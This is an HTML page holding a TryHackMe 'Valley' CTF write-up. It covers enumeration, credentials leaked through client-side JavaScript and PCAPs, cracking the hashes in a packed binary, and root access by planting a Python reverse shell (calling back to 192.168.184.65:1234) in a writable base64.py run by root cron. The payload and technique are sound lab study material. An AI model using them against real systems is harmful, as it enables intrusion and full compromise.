<!DOCTYPE html>

<html lang="en">
<head>
<meta charset="utf-8"/>
<meta content="width=device-width, initial-scale=1.0" name="viewport"/>
<title>Valley ‚Ä¢ syndro</title>
<script>
    (function() {
      const saved = localStorage.getItem('theme');
      const prefersLight = window.matchMedia('(prefers-color-scheme: light)').matches;
      if (saved === 'light' || (!saved && prefersLight)) document.documentElement.classList.add('light');
      else document.documentElement.classList.remove('light');
    })();
  </script>
<link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@500;700;900&amp;family=Roboto+Mono:wght@300;400;700&amp;display=swap" rel="stylesheet"/>
<link href="././style.css" rel="stylesheet"/>
<style>
    :root { --accent: #58a6ff; --green: #3fb950; --purple: #8b5cf6; --pink: #f472b6; }
    .light { --accent: #1f6feb; --green: #238636; }

    body {
      background: linear-gradient(135deg, #0f0c29, #302b63, #24243e);
      color: #e6edf3;
      font-family: 'Roboto Mono', monospace;
      min-height: 100vh;
      padding: 40px 20px;
      line-height: 1.8;
      transition: background 0.5s, color 0.5s;
    }
    .light body { background: #f6f8fa; color: #0d1117; }

    .container { max-width: 1100px; margin: 0 auto; position: relative; }

    h1 {
      font-family: 'Orbitron', sans-serif;
      font-size: 4.8rem;
      text-align: center;
      background: linear-gradient(90deg, var(--accent), var(--purple), var(--pink));
      -webkit-background-clip: text;
      -webkit-text-fill-color: transparent;
      margin: 20px 0 10px;
      text-shadow: 0 0 30px rgba(88,166,255,0.3);
    }
    .light h1 { background: linear-gradient(90deg, #1f6feb, #7c3aed, #ec4899); -webkit-background-clip: text; }

    .meta { text-align: center; opacity: 0.9; font-size: 1.15rem; margin-bottom: 26px; }
    .meta span { color: var(--accent); font-weight: bold; }

    .topbar {
      display: flex;
      justify-content: center;
      gap: 14px;
      flex-wrap: wrap;
      margin: 18px 0 45px;
    }
    .btn {
      border: 1px solid rgba(88,166,255,0.35);
      background: rgba(88,166,255,0.08);
      color: inherit;
      padding: 10px 14px;
      border-radius: 12px;
      cursor: pointer;
      font-family: inherit;
      transition: transform .2s ease, box-shadow .2s ease, background .2s ease;
      text-decoration: none;
      display: inline-flex;
      align-items: center;
      gap: 8px;
    }
    .btn:hover {
      transform: translateY(-1px);
      box-shadow: 0 10px 30px rgba(88,166,255,0.18);
      background: rgba(88,166,255,0.14);
    }

    h2 { color: var(--accent); margin: 55px 0 18px; font-family: 'Orbitron', sans-serif; font-size: 2.2rem; }
    h3 { margin: 22px 0 12px; font-family: 'Orbitron', sans-serif; font-size: 1.3rem; opacity: 0.95; }

    p { margin: 18px 0; }

    pre {
      background: #161b22 !important;
      color: #f0f6fc !important;
      padding: 20px;
      border-radius: 14px;
      overflow-x: auto;
      border: 1px solid #30363d;
      font-size: 1.05rem;
      margin: 22px 0;
      white-space: pre-wrap;
    }
    .light pre {
      background: #f6f8fa !important;
      color: #24292f !important;
      border: 1px solid #d0d7de !important;
    }

    code {
      background: rgba(88,166,255,0.1);
      padding: 4px 10px;
      border-radius: 8px;
      color: var(--green);
    }
    .light code { background: rgba(30,110,254,0.15); }

    .container img {
      display: block;
      max-width: 100%;
      border-radius: 16px;
      margin: 28px auto;
      box-shadow: 0 20px 60px rgba(0,0,0,0.6);
      border: 2px solid rgba(88,166,255,0.3);
      cursor: zoom-in !important;
      transition: all 0.4s ease;
      user-select: none;
    }
    .light .container img { box-shadow: 0 15px 40px rgba(0,0,0,0.15); }
    .container img:hover {
      transform: scale(1.03);
      box-shadow: 0 25px 80px rgba(88,166,255,0.6);
    }

    ul { margin: 16px 0; padding-left: 40px; }
    li { margin: 10px 0; }

    .callout {
      border: 1px solid rgba(63,185,80,0.35);
      background: rgba(63,185,80,0.08);
      padding: 16px 18px;
      border-radius: 14px;
      margin: 22px 0;
    }
    .callout strong { color: var(--green); }

    .toc {
      border: 1px solid rgba(88,166,255,0.3);
      background: rgba(88,166,255,0.08);
      padding: 16px 18px;
      border-radius: 14px;
      margin: 18px 0 30px;
    }
    .toc a { color: inherit; text-decoration: none; border-bottom: 1px dashed rgba(88,166,255,0.45); }
    .toc a:hover { color: var(--accent); }

    /* Image Zoom Modal */
    #imageModal {
      position: fixed;
      inset: 0;
      background: rgba(0,0,0,0.85);
      display: none;
      align-items: center;
      justify-content: center;
      z-index: 9999;
      padding: 20px;
    }
    #imageModal.active { display: flex; }
    #imageModal img {
      max-width: min(1100px, 96vw);
      max-height: 92vh;
      border-radius: 16px;
      border: 2px solid rgba(88,166,255,0.35);
      box-shadow: 0 30px 90px rgba(0,0,0,0.8);
      cursor: zoom-out;
    }
    .close-modal {
      position: fixed;
      top: 18px;
      right: 18px;
      font-size: 34px;
      line-height: 34px;
      width: 44px;
      height: 44px;
      display: grid;
      place-items: center;
      border-radius: 12px;
      background: rgba(255,255,255,0.08);
      border: 1px solid rgba(255,255,255,0.14);
      cursor: pointer;
      user-select: none;
    }
    .back {
      position: fixed;
      top: 30px;
      left: 30px;
      background: var(--accent);
      color: #000;
      padding: 16px 42px;
      border-radius: 50px;
      font-weight: bold;
      text-decoration: none;
      box-shadow: 0 12px 40px rgba(88,166,255,0.6);
      transition: all 0.4s ease;
      z-index: 9999;
      font-size: 1.1rem;
    }
    .back:hover { transform: translateY(-8px) scale(1.05); box-shadow: 0 20px 60px rgba(88,166,255,0.8); }
    .light .back { color: white; }
  </style>
<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&amp;display=swap" rel="stylesheet"/><style id="wh-unified-style">
/* ===== cyber-whisperer unified writeup UI (blue-ish) ===== */
body.wh-writeup{
  --wh-accent: #58a6ff;
  --wh-accent2:#06b6d4;
  --wh-surface: rgba(13,17,23,.62);
  --wh-surface2: rgba(17,24,39,.55);
  --wh-border: rgba(88,166,255,.22);
  --wh-text: #e6edf3;
  --wh-muted: rgba(230,237,243,.72);
  --wh-shadow: rgba(0,0,0,.55);
  background:
    radial-gradient(1200px 700px at 12% 10%, rgba(88,166,255,.22), transparent 55%),
    radial-gradient(900px 650px at 88% 18%, rgba(6,182,212,.18), transparent 52%),
    radial-gradient(950px 680px at 50% 92%, rgba(139,92,246,.16), transparent 58%),
    linear-gradient(135deg,#070a16,#111a33 45%,#07101f);
  color: var(--wh-text);
  padding: 70px 18px 60px;
  min-height: 100vh;
  overflow-x: hidden;
}

html.light body.wh-writeup{
  --wh-accent:#1f6feb;
  --wh-accent2:#0891b2;
  --wh-surface: rgba(255,255,255,.78);
  --wh-surface2: rgba(255,255,255,.66);
  --wh-border: rgba(31,111,235,.20);
  --wh-text: #0d1117;
  --wh-muted: rgba(13,17,23,.70);
  --wh-shadow: rgba(0,0,0,.12);
  background:
    radial-gradient(1200px 700px at 12% 10%, rgba(31,111,235,.18), transparent 55%),
    radial-gradient(900px 650px at 88% 18%, rgba(8,145,178,.14), transparent 52%),
    radial-gradient(950px 680px at 50% 92%, rgba(124,58,237,.12), transparent 58%),
    linear-gradient(180deg,#f8fafc,#eef2ff);
}

body.wh-writeup::before{
  content:"";
  position: fixed;
  inset:0;
  pointer-events:none;
  z-index:-1;
  background-image:
    linear-gradient(rgba(88,166,255,.10) 1px, transparent 1px),
    linear-gradient(90deg, rgba(88,166,255,.10) 1px, transparent 1px);
  background-size: 86px 86px;
  opacity:.22;
  mask-image: radial-gradient(circle at 50% 35%, rgba(0,0,0,.95) 0, rgba(0,0,0,0) 70%);
}

#whProgress{
  position: fixed;
  top:0; left:0;
  width:100%;
  height:4px;
  z-index:100000;
  background: rgba(255,255,255,.06);
}
#whProgress > div{
  height:100%;
  width:0%;
  background: linear-gradient(90deg, var(--wh-accent), var(--wh-accent2), #8b5cf6);
  box-shadow: 0 0 20px rgba(88,166,255,.45);
}

.wh-shell{
  max-width: 1500px;
  margin: 0 auto;
  display: grid;
  grid-template-columns: minmax(0, 1fr) 320px;
  gap: 22px;
  align-items: start;
}
@media (max-width: 1150px){
  .wh-shell{ grid-template-columns: 1fr; }
}

body.wh-writeup .container{
  max-width: 100% !important;
  margin: 0 !important;
  padding: 28px 28px 32px !important;
  border-radius: 26px;
  background: linear-gradient(180deg, var(--wh-surface), var(--wh-surface2));
  border: 1px solid var(--wh-border);
  box-shadow: 0 24px 80px var(--wh-shadow);
  backdrop-filter: blur(14px);
  position: relative;
}

body.wh-writeup .container::after{
  content:"";
  position:absolute;
  inset:0;
  border-radius:26px;
  pointer-events:none;
  background: radial-gradient(600px 220px at 30% 0%, rgba(88,166,255,.14), transparent 60%);
  opacity: .8;
}

body.wh-writeup h1{
  letter-spacing: .5px;
  margin-top: 6px !important;
}

body.wh-writeup .meta{
  color: var(--wh-muted) !important;
  margin-bottom: 16px !important;
}

body.wh-writeup .topbar{
  position: sticky;
  top: 14px;
  z-index: 9999;
  display:flex;
  flex-wrap: wrap;
  gap: 10px;
  justify-content: center;
  padding: 12px 12px;
  border-radius: 18px;
  background: rgba(0,0,0,.18);
  border: 1px solid rgba(255,255,255,.10);
  backdrop-filter: blur(12px);
  box-shadow: 0 14px 40px rgba(0,0,0,.25);
  margin: 14px 0 28px !important;
}
html.light body.wh-writeup .topbar{ background: rgba(255,255,255,.55); border-color: rgba(31,111,235,.12); }

body.wh-writeup .btn{
  border: 1px solid rgba(88,166,255,.28) !important;
  background: rgba(88,166,255,.10) !important;
  color: inherit !important;
  padding: 10px 14px !important;
  border-radius: 999px !important;
  cursor: pointer;
  font-family: inherit;
  transition: transform .18s ease, box-shadow .18s ease, background .18s ease, border-color .18s ease;
  text-decoration: none;
  display: inline-flex;
  align-items: center;
  gap: 8px;
  user-select: none;
}
body.wh-writeup .btn:hover{
  transform: translateY(-1px);
  background: rgba(88,166,255,.16) !important;
  border-color: rgba(88,166,255,.55) !important;
  box-shadow: 0 18px 45px rgba(88,166,255,.18);
}

body.wh-writeup .btn.wh-primary{
  background: linear-gradient(90deg, rgba(88,166,255,.22), rgba(6,182,212,.20)) !important;
  border-color: rgba(88,166,255,.55) !important;
}

body.wh-writeup h2, body.wh-writeup h3, body.wh-writeup .toc{ scroll-margin-top: 120px; }

.wh-aside{
  position: sticky;
  top: 92px;
}
@media (max-width:1150px){
  .wh-aside{ position: relative; top: 0; }
}

.wh-aside-card{
  border-radius: 22px;
  padding: 18px 16px;
  background: linear-gradient(180deg, rgba(13,17,23,.55), rgba(17,24,39,.45));
  border: 1px solid rgba(88,166,255,.20);
  box-shadow: 0 18px 60px rgba(0,0,0,.35);
  backdrop-filter: blur(12px);
}
html.light .wh-aside-card{ background: rgba(255,255,255,.65); border-color: rgba(31,111,235,.14); box-shadow: 0 18px 60px rgba(0,0,0,.10); }

.wh-aside-title{
  font-family: 'Inter', system-ui, -apple-system, Segoe UI, Roboto, sans-serif;
  font-weight: 700;
  letter-spacing: .2px;
  color: var(--wh-text);
  margin: 2px 6px 10px;
  opacity: .92;
}

#whToc a{
  display:flex;
  gap:10px;
  align-items: baseline;
  padding: 9px 10px;
  border-radius: 14px;
  border: 1px solid transparent;
  text-decoration:none;
  color: var(--wh-muted);
  font-size: .98rem;
  line-height: 1.2;
}
#whToc a:hover{
  color: var(--wh-text);
  border-color: rgba(88,166,255,.20);
  background: rgba(88,166,255,.10);
}
#whToc a.active{
  color: var(--wh-text);
  border-color: rgba(88,166,255,.38);
  background: rgba(88,166,255,.16);
}
#whToc .wh-dot{
  width: 8px; height: 8px;
  border-radius: 50%;
  margin-top: 3px;
  background: rgba(88,166,255,.30);
  flex: 0 0 auto;
}
#whToc a.active .wh-dot{ background: rgba(88,166,255,.90); box-shadow: 0 0 18px rgba(88,166,255,.55); }

/* Make images & code blocks feel less "floating" */
body.wh-writeup pre{ box-shadow: 0 18px 60px rgba(0,0,0,.35) !important; }
html.light body.wh-writeup pre{ box-shadow: 0 18px 60px rgba(0,0,0,.08) !important; }

/* Subtle section dividers */
body.wh-writeup h2{
  position: relative;
  padding-bottom: 10px;
}
body.wh-writeup h2::after{
  content:"";
  position:absolute;
  left:0;
  bottom: 0;
  width: 120px;
  height: 2px;
  background: linear-gradient(90deg, var(--wh-accent), transparent);
  opacity: .85;
}
</style></head>
<body class="wh-writeup"><div id="whProgress"><div></div></div>
<div class="wh-shell"><div class="container">
<h1>Valley</h1>
<div class="meta">
      CTF: <span>TryHackMe</span> ‚Ä¢ Category: <span>Linux</span> ‚Ä¢ Difficulty: <span>Easy</span>
</div>
<a class="back" href="../Tryhackme.html">Back</a>
<div class="topbar">
<button class="btn" id="themeToggle" type="button">üåì Toggle theme</button>
<a class="btn" href="#recon">üîé Recon</a>
<a class="btn" href="#web">üåê Web Enum</a>
<a class="btn" href="#ftp">üì¶ FTP</a>
<a class="btn" href="#pcap">ü¶à PCAP</a>
<a class="btn" href="#ssh">üîê SSH</a>
<a class="btn" href="#pe">‚ö° PrivEsc</a>
</div>
<div class="toc">
<p><strong>Goal</strong>: answer both questions:</p>
<ul>
<li>What is the <strong>user</strong> flag?</li>
<li>What is the <strong>root</strong> flag?</li>
</ul>
<p><strong>Target</strong>: <code>10.80.184.98</code></p>
</div>
<p>
      This writeup follows the simplest path: start with full recon, pivot through the web app to get FTP access,
      extract SSH creds from a PCAP, then escalate to root through a writable Python library used by a root cron job.
    </p>
<img alt="Initial enumeration screenshot" src="Pasted image 20260216181134.png"/>
<!-- 1) RECON -->
<h2 id="recon">1) Recon (Nmap)</h2>
<p>
      First step is always service discovery: identify what‚Äôs exposed and what‚Äôs worth enumerating.
    </p>
<pre><code>nmap -sV -r -T4 -Pn -p- -oN nmap1.nmap 10.80.184.98 -v</code></pre>
<img alt="Nmap results screenshot" src="Pasted image 20260216181740.png"/>
<div class="callout">
<strong>Key findings:</strong>
<ul>
<li><strong>22</strong> (SSH) ‚Äî likely final access later</li>
<li><strong>80</strong> (HTTP) ‚Äî main attack surface for creds / hints</li>
<li><strong>37370</strong> (FTP on a non-standard port) ‚Äî probably contains files we need</li>
</ul>
</div>
<!-- 2) WEB ENUM -->
<h2 id="web">2) Web Enumeration (FFUF)</h2>
<p>
      Next, brute-force directories to discover hidden routes and developer leftovers.
    </p>
<pre><code>ffuf -u http://10.80.184.98/FUZZ \
-w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt \
-fc 404 -s</code></pre>
<img alt="FFUF results screenshot" src="Pasted image 20260216182149.png"/>
<p>
      We discover multiple routes. <code>/gallery</code> and <code>/static</code> look normal for the site,
      while <code>/pricing</code> is interesting because it contains internal files.
    </p>
<img alt="Pricing directory listing screenshot" src="Pasted image 20260216182248.png"/>
<h3>note.txt</h3>
<img alt="note.txt content screenshot" src="Pasted image 20260216182258.png"/>
<!-- 3) FTP (ANON FAIL) -->
<h2 id="ftp">3) FTP (Anonymous attempt)</h2>
<p>
      FTP is running on port <code>37370</code>, so we try a basic login first. No luck: it requires credentials.
    </p>
<pre><code>ftp 10.80.184.98 37370</code></pre>
<img alt="FTP anonymous attempt screenshot" src="Pasted image 20260216182452.png"/>
<div class="callout">
<strong>Pointer:</strong> when a service blocks anonymous access, the creds usually come from the web app
      (hardcoded JS, leaked configs, backups, dev panels).
    </div>
<!-- 4) DEEPER ENUM -->
<h2>4) Deeper Enumeration (static ‚Üí dev)</h2>
<p>
      With FTP blocked, we keep digging on the website. Eventually we find a clue inside <code>/static</code>
      that leads to a hidden dev area.
    </p>
<img alt="Further enumeration screenshot" src="Pasted image 20260216183127.png"/>
<p>We spot <strong>"00"</strong> under <code>/static/fuzz</code>:</p>
<img alt="Static 00 discovery screenshot" src="Pasted image 20260216183159.png"/>
<h2>5) Hidden Dev Login (/dev)</h2>
<img alt="/dev login page screenshot" src="Pasted image 20260216183243.png"/>
<p>
      The <code>/dev</code> page is a login portal. Instead of guessing, check the page source.
      A referenced script (<code>/dev.js</code>) contains the validation logic on the client side
      (front-end), which means credentials can be exposed.
    </p>
<img alt="dev.js screenshot" src="Pasted image 20260216183426.png"/>
<div class="callout">
<strong>Creds found in dev.js:</strong>
<ul>
<li>Username: <code>siemDev</code></li>
<li>Password: <code>california</code></li>
</ul>
</div>
<p>
      After logging in, we get a note ‚Äî the important hint is: <em>"Stop reusing credentials"</em>.
      That‚Äôs a strong signal to try the same creds on other services (FTP/SSH/etc).
    </p>
<img alt="Dev note screenshot" src="Pasted image 20260216183539.png"/>
<!-- 6) FTP WITH CREDS -->
<h2>6) FTP (Authenticated)</h2>
<p>
      Use the dev creds on FTP. It works.
    </p>
<pre><code>ftp 10.80.184.98 37370</code></pre>
<img alt="FTP login success screenshot" src="Pasted image 20260216183656.png"/>
<p>
      Listing the directory shows <strong>three</strong> Wireshark capture files (<code>.pcapng</code>).
      Download them locally and inspect in Wireshark.
    </p>
<img alt="FTP dir listing screenshot" src="Pasted image 20260216183833.png"/>
<pre><code># Typical FTP workflow
dir
get file1.pcapng
get file2.pcapng
get file3.pcapng

# (Optional) if allowed by the server:
# mget *.pcapng</code></pre>
<!-- 7) PCAP -->
<h2 id="pcap">7) PCAP Analysis (Wireshark)</h2>
<p>
      Open the captures and focus on credential-bearing traffic. Since we expect logins,
      filtering POST requests is a quick win:
    </p>
<pre><code>http.request.method == "POST"</code></pre>
<img alt="Wireshark credentials screenshot" src="Pasted image 20260216184147.png"/>
<div class="callout">
<strong>SSH creds recovered from PCAP:</strong>
<ul>
<li>Username: <code>valleyDev</code></li>
<li>Password: <code>ph0t0s1234</code></li>
</ul>
</div>
<!-- 8) SSH -->
<h2 id="ssh">8) SSH (User flag)</h2>
<p>Login with the recovered credentials:</p>
<pre><code>ssh valleyDev@10.80.184.98</code></pre>
<img alt="SSH login / user flag screenshot" src="Pasted image 20260216184409.png"/>
<p>
      At this point, the <strong>user flag</strong> is available. Next goal: <strong>root</strong>.
    </p>
<!-- 9) PRIVESC PART 1 -->
<h2 id="pe">9) Privilege Escalation (Part 1 ‚Äî valleyAuthenticator)</h2>
<p>
      Basic checks first:
    </p>
<pre><code>sudo -l
sudo -i</code></pre>
<p>
      No sudo permissions, so we enumerate the filesystem manually. In <code>/home</code>, we find a binary:
      <code>valleyAuthenticator</code>. It prompts for credentials, so we pull it locally and reverse it.
    </p>
<h3>Transfer the binary (ncat)</h3>
<pre><code># On your local machine:
nc -lp 1234 &gt; valleyAuthenticator

# On the victim machine:
nc 192.168.184.65 1234 &lt; valleyAuthenticator</code></pre>
<p>
      The binary is packed, so unpack it with UPX, then open in Ghidra:
    </p>
<pre><code>upx -d valleyAuthenticator</code></pre>
<img alt="Ghidra analysis screenshot" src="Pasted image 20260216190718.png"/>
<p>
      In the decompiled output we find <strong>two MD5 hashes</strong> (one for username, one for password).
      Cracking them (e.g., CrackStation) reveals:
    </p>
<img alt="Cracked MD5 screenshot" src="Pasted image 20260216190852.png"/>
<div class="callout">
<strong>Cracked creds:</strong>
<ul>
<li>Username: <code>valley</code></li>
<li>Password: <code>liberty123</code></li>
</ul>
</div>
<p>
      The authenticator prints ‚Äúauthenticated‚Äù, so the creds are valid somewhere. The obvious next try is SSH:
    </p>
<pre><code>ssh valley@10.80.184.98</code></pre>
<!-- 10) PRIVESC PART 2 -->
<h2>10) Privilege Escalation (Part 2 ‚Äî Cron + Python hijack)</h2>
<p>
      As <code>valley</code>, we still don‚Äôt get sudo. So we hunt for root automation:
      cron jobs, systemd timers, backups, scripts, writable paths.
    </p>
<pre><code>cat /etc/crontab</code></pre>
<img alt="Crontab screenshot" src="Pasted image 20260216191259.png"/>
<p>
      We spot a root-run Python script:
      <code>/photos/script/photosEncrypt.py</code>
</p>
<img alt="photosEncrypt.py screenshot" src="Pasted image 20260216191414.png"/>
<div class="callout">
<strong>Pointer:</strong> If a root Python script imports a module and you can write to that module‚Äôs file,
      you can hijack the import and execute code as root when the cron runs.
    </div>
<p>
      The script imports <code>base64</code>, so we locate the module on disk and check permissions:
    </p>
<pre><code>locate base64.py
ls -l /usr/lib/python3.8/base64.py</code></pre>
<img alt="base64.py permissions screenshot" src="Pasted image 20260216191540.png"/>
<p>
<strong>base64.py is writable</strong>. We add a reverse shell payload inside it.
      (Make sure you have a listener ready on your box.)
    </p>
<h3>Listener (your machine)</h3>
<pre><code>nc -lvnp 1234</code></pre>
<h3>Payload (insert into /usr/lib/python3.8/base64.py)</h3>
<pre><code>import socket
import subprocess
import os

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("192.168.184.65", 1234))
os.dup2(s.fileno(), 0)
os.dup2(s.fileno(), 1)
os.dup2(s.fileno(), 2)
import pty; pty.spawn("/bin/sh")</code></pre>
<p>Reference: revshell generator at https://www.revshells.com/</p>
<img alt="Reverse shell screenshot" src="Pasted image 20260216192129.png"/>
<p>
      After the cron executes the root Python script, we receive a root shell.
      Then we read the root flag and finish the room.
    </p>
<img alt="Root flag screenshot" src="Pasted image 20260216192215.png"/>
<div class="callout">
<strong>Takeaways:</strong>
<ul>
<li>Client-side auth (JS validation) leaks secrets.</li>
<li>Credential reuse turns small leaks into full compromise.</li>
<li>PCAPs often contain plaintext credentials (especially HTTP).</li>
<li>Writable Python libs + root cron = instant privilege escalation.</li>
</ul>
</div>
</div><aside class="wh-aside"><div class="wh-aside-card"><div class="wh-aside-title">On this page</div><nav id="whToc"></nav></div></aside></div>
<!-- Image Zoom Modal -->
<div id="imageModal">
<div class="close-modal">√ó</div>
<img alt="Zoomed image" id="modalImage" src=""/>
</div>
<script type="text/javascript">
    var sc_project=13192699;
    var sc_invisible=1;
    var sc_security="f34343e1";
    var scJsHost = "https://";
    document.write("<sc"+"ript type='text/javascript' src='" +
      scJsHost + "statcounter.com/counter/counter.js'></"+"script>");
  </script>
<noscript>
<div class="statcounter">
<img alt="statcounter" class="statcounter" src="https://c.statcounter.com/13192699/0/f34343e1/1/"/>
</div>
</noscript>
<script>
    // Theme toggle
    document.getElementById('themeToggle')?.addEventListener('click', () => {
      document.documentElement.classList.toggle('light');
      localStorage.theme = document.documentElement.classList.contains('light') ? 'light' : 'dark';
    });

    // Image zoom modal
    const modal = document.getElementById('imageModal');
    const modalImg = document.getElementById('modalImage');
    const closeModalBtn = document.querySelector('#imageModal .close-modal');

    document.querySelectorAll('.container img').forEach(img => {
      img.style.cursor = 'zoom-in';
      img.onclick = function(e) {
        e.stopPropagation();
        modalImg.src = this.src;
        modal.classList.add('active');
        document.body.style.overflow = 'hidden';
      };
    });

    closeModalBtn.onclick = () => {
      modal.classList.remove('active');
      document.body.style.overflow = '';
    };

    modal.onclick = (e) => {
      if (e.target === modal) {
        modal.classList.remove('active');
        document.body.style.overflow = '';
      }
    };

    document.addEventListener('keydown', (e) => {
      if (e.key === 'Escape' && modal.classList.contains('active')) {
        modal.classList.remove('active');
        document.body.style.overflow = '';
      }
    });
  </script>
<script id="wh-unified-script">
(function(){
  // Progress bar
  const bar = document.querySelector('#whProgress > div');
  const updateProgress = () => {
    if(!bar) return;
    const doc = document.documentElement;
    const scrollTop = doc.scrollTop || document.body.scrollTop;
    const height = (doc.scrollHeight - doc.clientHeight) || 1;
    const pct = Math.min(100, Math.max(0, (scrollTop / height) * 100));
    bar.style.width = pct.toFixed(2) + '%';
  };
  window.addEventListener('scroll', updateProgress, {passive:true});
  updateProgress();

  // Ensure we only have ONE working theme toggle (remove older listeners by cloning)
  const original = document.getElementById('themeToggle');
  if (original) {
    const clone = original.cloneNode(true);
    original.parentNode.replaceChild(clone, original);
    clone.addEventListener('click', () => {
      document.documentElement.classList.toggle('light');
      localStorage.theme = document.documentElement.classList.contains('light') ? 'light' : 'dark';
    });
  }

  // Auto-topbar chips (only for pages that opted-in)
  const topbar = document.querySelector('.topbar.wh-auto-topbar');
  if(topbar){
    const makeSlug = (s) => (s || '').toLowerCase()
      .replace(/^[0-9]+\s*[\)|\.]\s*/,'')
      .replace(/[^a-z0-9\s-]/g,'')
      .trim().replace(/\s+/g,'-').slice(0,60) || ('section-' + Math.random().toString(16).slice(2));

    const pickEmoji = (t) => {
      const s = (t||'').toLowerCase();
      if(s.includes('goal')) return 'üéØ';
      if(s.includes('host')) return 'üß©';
      if(s.includes('recon') || s.includes('nmap') || s.includes('scan')) return 'üõ∞Ô∏è';
      if(s.includes('enum') || s.includes('fuzz') || s.includes('dir')) return 'üß™';
      if(s.includes('login') || s.includes('auth')) return 'üîê';
      if(s.includes('api')) return 'üß≠';
      if(s.includes('ssrf')) return 'üï≥Ô∏è';
      if(s.includes('ssti')) return 'üß®';
      if(s.includes('ftp')) return 'üì¶';
      if(s.includes('pcap') || s.includes('wireshark')) return 'ü¶à';
      if(s.includes('ssh')) return 'üóùÔ∏è';
      if(s.includes('priv') || s.includes('privesc')) return '‚ö°';
      if(s.includes('flag')) return 'üèÅ';
      if(s.includes('exploit') || s.includes('rce')) return 'üí•';
      if(s.includes('sql')) return 'üß¨';
      if(s.includes('xss')) return 'üß∑';
      return 'üìå';
    };

    const container = document.querySelector('.container');
    const anchors = [];

    const goals = container?.querySelector('.toc#goals');
    if(goals) anchors.push({el: goals, label: 'Goals'});

    (container ? Array.from(container.querySelectorAll('h2')) : []).forEach(h => {
      anchors.push({el: h, label: h.textContent || 'Section'});
    });

    // Create chips after the theme toggle button
    const themeBtn = topbar.querySelector('#themeToggle');
    anchors.forEach(({el, label}) => {
      if(!el.id) el.id = makeSlug(label);
      const clean = (label||'').replace(/^[0-9]+\s*[\)|\.]\s*/,'').trim();
      const a = document.createElement('a');
      a.className = 'btn';
      a.href = '#' + el.id;
      a.textContent = pickEmoji(clean) + ' ' + (clean.length>24 ? clean.slice(0,24)+'‚Ä¶' : clean);
      // insert after theme button (keep toggle first)
      if(themeBtn && themeBtn.nextSibling) topbar.insertBefore(a, themeBtn.nextSibling);
      else topbar.appendChild(a);
    });
  }

  // Right-side TOC (all writeups)
  const toc = document.getElementById('whToc');
  const container = document.querySelector('.container');
  if(toc && container){
    const makeSlug = (s) => (s || '').toLowerCase()
      .replace(/^[0-9]+\s*[\)|\.]\s*/,'')
      .replace(/[^a-z0-9\s-]/g,'')
      .trim().replace(/\s+/g,'-').slice(0,60) || ('section-' + Math.random().toString(16).slice(2));

    const sections = [];
    const goals = container.querySelector('.toc#goals') || container.querySelector('.toc');
    if(goals){
      if(!goals.id) goals.id = 'goals';
      sections.push({el: goals, title: 'Goals'});
    }
    container.querySelectorAll('h2').forEach(h => {
      if(!h.id) h.id = makeSlug(h.textContent);
      const title = (h.textContent||'').replace(/^[0-9]+\s*[\)|\.]\s*/,'').trim();
      sections.push({el: h, title: title || 'Section'});
    });

    toc.innerHTML='';
    sections.forEach((s) => {
      const a = document.createElement('a');
      a.href = '#' + s.el.id;
      a.innerHTML = `<span class="wh-dot"></span><span>${s.title.length>32 ? s.title.slice(0,32)+'‚Ä¶' : s.title}</span>`;
      toc.appendChild(a);
    });

    const links = Array.from(toc.querySelectorAll('a'));
    const setActive = (id) => {
      links.forEach(l => l.classList.toggle('active', l.getAttribute('href') === '#'+id));
    };

    const obs = new IntersectionObserver((entries) => {
      const visible = entries
        .filter(e => e.isIntersecting)
        .sort((a,b) => b.intersectionRatio - a.intersectionRatio)[0];
      if(visible) setActive(visible.target.id);
    }, { root: null, threshold: [0.2,0.35,0.55], rootMargin: '-20% 0px -70% 0px' });

    sections.forEach(s => obs.observe(s.el));
    setActive(sections[0]?.el?.id || '');
  }
})();
</script></body>
</html>
